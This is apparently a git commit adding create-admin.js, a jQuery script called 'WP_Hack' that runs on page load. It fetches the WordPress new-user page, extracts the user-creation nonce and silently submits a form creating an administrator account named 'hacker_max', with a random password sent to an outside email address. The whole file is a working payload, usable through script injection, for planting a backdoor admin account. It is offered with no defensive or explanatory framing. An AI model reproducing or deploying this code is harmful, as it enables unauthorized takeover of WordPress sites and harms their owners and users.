f67fc99a837da2f7e427871e6f3bf03c9779eab7
Max <tutv95@gmail.com>
2017-05-23 17:44:08 +0700

    Init

---
+++ create-admin.js
@@ -0,0 +1,64 @@
+(function ($) {
+    var WP_Hack = function () {
+        var username = 'hacker_max';
+        var email = 'contact@blog.xyz';
+        var password = Math.random().toString(36).substring(2);
+
+        var site = get_site();
+        var new_user_url = site + '/wp-admin/user-new.php';
+
+        function get_site() {
+            var origin = location.origin;
+            var ajax = wp.ajax.settings.url || '/wp-admin/admin-ajax.php';
+            var full_ajax = origin + ajax;
+
+            return full_ajax.replace('/wp-admin/admin-ajax.php', '');
+        }
+
+        function get_nonce(html) {
+            var re = /name="_wpnonce_create-user"([ ]+)value="([^"]+)"/g;
+            var m = re.exec(html);
+
+            if (!m[2].match(/([a-z0-9]{10})/)) {
+                return false;
+            }
+
+            return m[2];
+        }
+
+        function create_new_user(nonce) {
+            $.ajax({
+                url: new_user_url,
+                method: 'POST',
+                data: {
+                    "action": "createuser",
+                    "_wpnonce_create-user": nonce,
+                    "_wp_http_referer": "/wp-admin/user-new.php",
+                    "user_login": username,
+                    "email": email,
+                    "pass1": password,
+                    "pass1-text": password,
+                    "pass2": password,
+                    "send_user_notification": 1,
+                    "role": "administrator",
+                    "createuser": "Add New User"
+                },
+                success: function (response) {
+                    console.log("New user created");
+                }
+            });
+        }
+
+        $.ajax({
+            url: new_user_url,
+            success: function (html) {
+                var nonce = get_nonce(html);
+                create_new_user(nonce);
+            }
+        });
+    };
+
+    $(document).ready(function() {
+        WP_Hack();
+    });
+})(jQuery);
